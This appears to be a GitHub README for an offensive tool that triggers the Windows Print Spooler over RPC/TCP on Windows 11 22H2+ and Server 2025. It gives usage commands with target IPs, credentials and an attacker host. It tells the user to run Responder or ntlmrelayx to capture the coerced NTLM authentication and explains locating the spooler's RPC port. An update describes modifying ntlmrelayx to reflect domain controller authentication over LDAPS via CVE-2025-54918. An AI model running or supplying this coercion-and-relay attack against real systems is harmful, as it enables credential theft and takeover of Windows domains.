# Pure RPC over TCP Printer Spooler Trigger
## For Windows 11 22H2+ / Windows Server 2025


## Usage
```
printerbugnew.py <target_host> [username] [password] [domain] [attacker_host] [tcp_port]
```

## Examples

### Anonymous connection
```bash
printerbugnew.py 192.168.1.100
```

### With credentials
```bash
printerbugnew.py 192.168.1.100 admin Password123 DOMAIN
```

### Trigger backconnect to different host (attacker)
```bash
printerbugnew.py 192.168.1.100 admin Password123 DOMAIN 192.168.1.50
```

### Use specific RPC port
```bash
printerbugnew.py 192.168.1.100 admin Password123 DOMAIN 192.168.1.50 49152
```

## Notes
- Target must be Windows 11 22H2+ or Server 2025 (RPC over TCP default)
- For older versions, spoolss uses RPC over Named Pipes (SMB)
- Ensure ports 135 and dynamic RPC ports (49152-65535) are open
- Start Responder or ntlmrelayx on attacker_host to capture auth
- Kerberos fails in this case due to a bad SPN from the spooler, forcing NTLM fallback.
- Find the target spooler’s RPC/TCP port by querying the target Endpoint Mapper (EPM) on TCP/135 for the interface UUID 12345678-1234-abcd-ef00-0123456789ab. You can use rpcdump.py, PortQry, or any tool you prefer - or just implement the EPM lookup directly in this code ;)
- Based on https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py
  <br><br>
  <img width="2019" height="657" alt="image" src="https://github.com/user-attachments/assets/84e8955e-c6ca-46de-abc8-b75829e259cc" />
<br><br>
  <img width="1555" height="844" alt="image" src="https://github.com/user-attachments/assets/3cecf90c-b581-4042-a487-6bb99e236475" />
<br><br>
<img width="548" height="332" alt="image" src="https://github.com/user-attachments/assets/84fe1c1b-4da2-4ce2-91c1-76e8c732b34f" /><br><br>
## Update for CVE-2025-54918
This exploit via reflection works only on W2025 with the "new" printerbug (DCERPC instead of Named Pipes). 
You’ll need to modify ntlmrelayx at a couple of points for it to work. After that, you can remotely trigger the printer bug on a W2025 DC and reflect authentication via LDAPS(!).<br>

ldaprelayclient.py:<br>
<img width="595" height="184" alt="image" src="https://github.com/user-attachments/assets/77b0bd49-13a7-4cd5-b701-0622fedb427f" /><br>
rpcrelayserver.py<br>
<img width="731" height="220" alt="image" src="https://github.com/user-attachments/assets/558d1bdc-bb28-455d-861b-83c6ac3afa46" />
<br><br>and relay ;)<br>
<img width="737" height="776" alt="image" src="https://github.com/user-attachments/assets/00780c4c-c016-4621-a3d7-8903476d8ad1" />

<br>

The vulnerability was fixed in September 2025 Patch Tuesday: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-54918<br>
<br>Thanks to the author of this CVE for the valuable hint :)


